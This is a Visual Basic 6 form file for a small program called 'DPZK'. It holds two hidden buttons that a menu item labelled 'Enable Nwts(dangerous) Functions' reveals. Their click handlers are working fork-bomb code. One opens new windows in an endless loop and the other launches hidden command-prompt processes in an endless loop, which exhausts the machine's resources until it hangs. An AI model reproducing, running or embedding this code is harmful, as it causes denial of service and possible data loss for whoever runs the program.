VERSION 5.00
Begin VB.Form DPZKMAIN 
   Caption         =   "DPZK"
   ClientHeight    =   5355
   ClientLeft      =   225
   ClientTop       =   870
   ClientWidth     =   8280
   LinkTopic       =   "Form2"
   ScaleHeight     =   5355
   ScaleWidth      =   8280
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "DON'T EVEN LOOK AT THIS"
      Height          =   615
      Left            =   1320
      TabIndex        =   1
      Top             =   0
      Visible         =   0   'False
      Width           =   1575
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Don't Touch"
      Height          =   615
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Menu opt 
      Caption         =   "Options"
      Begin VB.Menu OpNwts 
         Caption         =   "Enable Nwts(dangerous) Functions"
         Index           =   1
      End
   End
End
Attribute VB_Name = "DPZKMAIN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Command1.Caption = "lol"
Do While True
Dim Form As New Form1
Form.Show
Loop
'lol
End Sub

Private Sub Command2_Click()
Command2.Caption = "lol"
Do While True
Dim lol
lol = Shell("cmd", vbHide)
'LOL
Loop
End Sub
' DONT TRY THOSE ABOVE
Private Sub OpNwts_Click(Index As Integer)
Command1.Visible = True
Command2.Visible = True

End Sub
